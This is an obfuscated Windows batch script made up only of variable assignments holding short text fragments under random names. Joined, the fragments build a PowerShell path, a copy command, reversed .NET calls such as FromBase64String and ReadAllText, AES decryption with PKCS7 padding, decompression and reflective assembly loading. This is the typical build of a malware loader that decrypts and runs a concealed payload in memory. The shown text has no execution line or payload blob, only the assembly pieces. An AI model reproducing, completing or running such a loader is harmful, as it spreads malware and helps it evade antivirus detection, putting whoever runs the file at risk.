@echo off
set "HZCFBxvlzs=Po"
set "oEyJLOwTFI=\W"
set "mKXmAjQmIY=do"
set "TtIlJmvFtO=py"
set "KMCbIHypSG=:\"
set "NiBcxcCafc=Wi"
set "eSEuUiXuwG=.e"
set "CHqhXhXNga=1."
set "NENpKugcKx=ll"
set "xtVJbLJxbj=rs"
set "BfNeuGnZCP=xe"
set "OrYGEfSmhT=Sy"
set "aSYzqJDSQM=he"
set "WaPseioEFh=y "
set "NgMMbZuipi=s\"
set "zvCcEgRGDc=ow"
set "hWkNlqreJP= C"
set "XklGNIVOVr=rS"
set "lFUpUOqyGZ=nd"
set "ymzSzfoFrC=we"
set "woBhOtxVWs=0\"
set "vgDQRmhsLc=he"
set "BvOFXoTjhQ= /"
set "VKaXcGwNrA=ws"
set "CTdxrkCOnu=po"
set "KBlRqRzlSo=co"
set "ZkEPCxOVSS=\v"
set "thjxliwVyz=32"
set "tVLXXSUVrz=in"
set "qZJThsGyxr=st"
set "lVwdpeShoU=em"
set "oADYnEGmjC=we"
set "FizMBkOIHI=ll"
set "XaLCGrjDhc= %~dp0"
set "uLNOJyEZNQ=cd"
set "eUkBwNoBVQ=::De"
set "vlrTZfGBNl='txe"
set "uHAKVliAgD= = $"
set "tdUTZtWuAj='gni"
set "NGwFrypUYQ=urit"
set "UyqhuPcDJT=eam("
set "SUpMSaUMlc=6] -"
set "HEpEoHdWCe=rr.D"
set "ApBaFpHPMe=CFxo"
set "wYmKHUazDL=raph"
set "agxupVDQYd=;$AD"
set "gvMnJHYiJd=gth)"
set "yJfiUfRNfz=daeR"
set "nWsQYTnIHj=.Sec"
set "plNojupoCY=muur"
set "TSZMdcOMEp=gsYZ"
set "TiTAAfNmJd=);$m"
set "nSwqpOEYhH=and "
set "MsSkPZNpMd=Syst"
set "IxUkJAzDxG=flec"
set "OuepRHEHVi=lBlo"
set "aaRHmeejGp=n ''"
set "eocAdkUgZV=  $u"
set "HAUmFMgRkW=TYw "
set "cJvyJTMzbj=ress"
set "SfkgnjUrez=PKCS"
set "NSrVtkCSsZ=qCeH"
set "yGOXaQiKDZ== $C"
set "XnHTdPsQnt=WDOR"
set "dqiWoEqREZ=gnir"
set "hgrJVNpZUI=106u"
set "SosjDSOzfr=in $"
set "OloGETQvTB=, $W"
set "TDyYxXgXDd=rity"
set "TOwycUqJXw=TZMD"
set "wkmrUDzmoa=yR ="
set "bnuchxpkZV=oL'["
set "tWOvyMyPpS=[IO."
set "XgyZPaWcdv=]::N"
set "fSPLqSKVtf==');"
set "mDTFmNcyUg=skpj"
set "FnuBNrbkFe=tion"
set "GDpJRPHIvo=New-"
set "ajMgRPaBdm=comm"
set "nbMQglOECu=es, "
set "RqDikoXUdW=WDOR"
set "mIIElJCArJ=-4] "
set "dWOYnKzpcM=rt]:"
set "stosvtTztB=ateD"
set "aXXlLHpLnL=BC;$"
set "ogKzRtOmQe=Bmor"
set "SswwpdaQif='[-1"
set "mybDXEyAse=.-16"
set "nvgOAIEefz=skpj"
set "OMvwcVGOrj= = N"
set "brNdSCFwtF=ddin"
set "iAJiRrghuL=7;$C"
set "KivzNMzHIG=pose"
set "jgXAElWjDy=k; }"
set "duOrlWngFa=eH.I"
set "auBKABFjle=CqCe"
set "KOoeOuFPAE=$WDO"
set "hMMcSuRTMk=stem"
set "WuAmBolfOo=.Dis"
set "ebcjtxMVKv=$iKh"
set "nNZnvKTFmo=null"
set "dqUPiWwdRU=oint"
set "hFYBhzyTpo=:('g"
set "xkpZOqnKGc=;$Ua"
set "CiWsPktZYb=ne);"
set "bqZhQcFewL=.IO."
set "GkyKwgiWzj=)($u"
set "fEtxeNFdUD=$ADT"
set "wGJDoyUTkq= [Sy"
set "RgwVlkLQQS=ct S"
set "plpXbiyVXB='0Pg"
set "ySTNlYRsxl=ode]"
set "QImnKxqqqH=a = "
set "ukhpeDucep=hy.A"
set "nRtpnqkQDE=y]::"
set "JorjozHVEO=rtS4"
set "uVjuTzAfRa=fore"
set "HfZinEYApf= New"
set "wXZsiBWDji=y.Pa"
set "bPWgEzoUYv=RmAx"
set "xIfQyevRDv=vert"
set "RBWmiyWVmZ=$iKh"
set "dDnzZNdsiN= '')"
set "nSwotAtajY=join"
set "SPwzcBvTOF=TllA"
set "ZxpvmxkLGS=ert]"
set "cRCeFysAwl== [S"
set "RHuurXvBwM=t Sy"
set "nXbfuoThVV=$UaG"
set "BVzlbqjmIZ=]::("
set "PdUaQrvesh=oArr"
set "ejbobMUDNi=.Cry"
set "KXSkVWUAmJ=Secu"
set "LqRqOIpKdU=r = "
set "vPVRpLVdxu=yste"
set "SapCOOMIcV=orF'"
set "VNaLtbTKuJ=L4Yi"
set "JhIgQOgjnz=$WDO"
set "yjuMnVmTRz=YxVw"
set "aIxtrJVlBq=;$AD"
set "pHNMNttjkp=ewLi"
set "BAvfIQFrQj=ispo"
set "gjiLzJotgH=morF"
set "DFsqVkZkCl=m.Re"
set "ZFXWRexmcO=oin "
set "bxboAriGHH=ion."
set "rKQJORxcyJ=saBm"
set "YaqrfTLVCg=6esa"
set "TnOoXQCqVr=WDOR"
set "JILwgFjYLQ=Disp"
set "YvCUhidAHy=$iKh"
set "MsuPnAzKfU=TYw."
set "UNNsGfSWUl=] -j"
set "djRbzQMbuD=qCeH"
set "jOFxSSwqXl=('da"
set "QjLlWWlsYA=[Sys"
set "AUyNOShZsM=bjec"
set "vRqKSrrYBP=yste"
set "MuvTqjmjss=sion"
set "qFLyFuOXFi=)))"
set "fxaMBWdpEt=rans"
set "AIvXcNWdOS=raph"
set "NXUPlwoQJR=[Env"
set "BeIfvSBXMu=)) {"
set "VmnDGZgpBv=[-1."
set "UTyeXYQPQb=Obje"
set "RmwthvAmfn=Secu"
set "GFKPZysfPN=MDR."
set "KfvUJjlHyT=Ges."
